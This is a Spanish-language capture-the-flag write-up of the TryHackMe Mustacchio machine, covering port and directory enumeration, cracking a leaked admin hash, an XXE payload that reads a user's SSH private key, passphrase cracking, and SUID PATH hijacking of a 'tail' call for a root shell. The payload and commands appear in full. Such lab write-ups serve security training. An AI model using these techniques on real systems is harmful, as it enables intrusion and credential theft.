@@ -1,0 +1,78 @@
+Mustacchio CTF (TryHackMe)
+
+1. Reconnaissance & Enumeration (Reconocimiento)
+Comencé verificando la conectividad con la máquina objetivo mediante ping. Una vez confirmada, realicé un escaneo de puertos inicial con Nmap.
+  nmap 10.82.156.22
+
+Resultados del escaneo:
+Port 22 (SSH): OpenSSH.
+Port 80 (HTTP): Servidor web Apache.
+
+Web Enumeration (Port 80)
+Inspeccioné el archivo robots.txt, pero solo contenía la directiva "User-agent: * Disallow: /", redundante.
+
+Utilicé Gobuster para realizar fuerza bruta de directorios y descubrir rutas ocultas:
+gobuster dir -u http://10.82.156.22 -w /usr/share/wordlists/dirb/common.txt
+Gobuster reveló un directorio /custom/. Me llevó a una web de .css (redundante), deduje la posible existencia de una carpeta de scripts 
+y probé acceder a /custom/js/. 
+Allí encontré un archivo de respaldo olvidado: users.bak.
+
+
+{(MIENTRAS TANTO REALIZABA UN ESCANEO MAS PROFUNDO NMAP -P- -T4) -> Port 8765 (HTTP): Un puerto adicional encontrado.}
+--------
+
+2. Exploitation (Explotación)
+
+Descargué el archivo users.bak y verifiqué su tipo con el comando file, como resultado era una base de datos SQLite.
+Utilizando sqlite3, obtuve el contenido de la tabla users, obteniendo el hash de la contraseña del administrador: 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
+Utilicé John the Ripper con el diccionario rockyou.txt para romper el hash, obteniendo la contraseña en texto claro: bulldog19. 
+
+Admin Panel Access & XXE Attack
+Con las credenciales (admin:bulldog19), inicié sesión en el panel de administración ubicado en el puerto 8765.
+El panel permitía dejar comentarios. Al enviar uno, noté una alerta indicando "Insert XML Code", lo que sugería una vulnerabilidad de XXE (XML External Entity). 
+Además, el código fuente de la página (ctl+U) contenía un comentario oculto: "Barry, you can now SSH in using your key!"
+Esto confirmó mi vector de ataque: usar la vulnerabilidad XXE para leer la clave privada SSH (id_rsa) del usuario Barry.
+
+Payload XXE utilizado:
+XML
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY file SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
+<comment>
+  <name>&file;</name>
+  <author>Zoe</author>
+  <com>Test</com>
+</comment>
+Al enviar este payload, el servidor procesó la entidad externa y devolvió el contenido de la clave privada RSA en el campo "Name".
+
+SSH Access
+La clave obtenida estaba encriptada (protegida por contraseña).
+Guardé la clave en un archivo id_rsa. 
+Utilicé ssh2john para convertirla a un formato crackeable. (hash)
+Utilicé John the Ripper nuevamente para obtener la frase de paso: "urieljames".
+Finalmente, accedí al sistema:
+chmod 600 id_rsa
+ssh -i id_rsa barry@10.82.156.22
+
+-------
+
+3. Privilege Escalation 
+Ya dentro del sistema, busqué binarios con permisos SUID (Set User ID) que pudieran permitirme ejecutar comandos como root.
+find / -perm -u=s -type f 2>/dev/null
+
+El comando reveló un binario inusual: /home/joe/live_log. Al ejecutar strings sobre este binario, 
+descubrí que estaba llamando al comando tail sin usar su ruta absoluta (usaba tail en lugar de /usr/bin/tail).
+
+Ataque: Path Hijacking Dado que el binario confía en la variable de entorno PATH para encontrar tail, pude secuestrar la ejecución:
+Me moví a /tmp (donde tengo permisos de escritura).
+Creé un archivo falso llamado tail que invocaba una shell:
+echo "/bin/bash" > tail
+chmod +x tail
+Modifiqué mi PATH para que el sistema busque en /tmp primero:
+export PATH=/tmp:$PATH
+Ejecuté el binario vulnerable:
+/home/joe/live_log
+El programa ejecutó mi script malicioso con los permisos del propietario (root), otorgándome una shell con privilegios máximos.
+
+
+
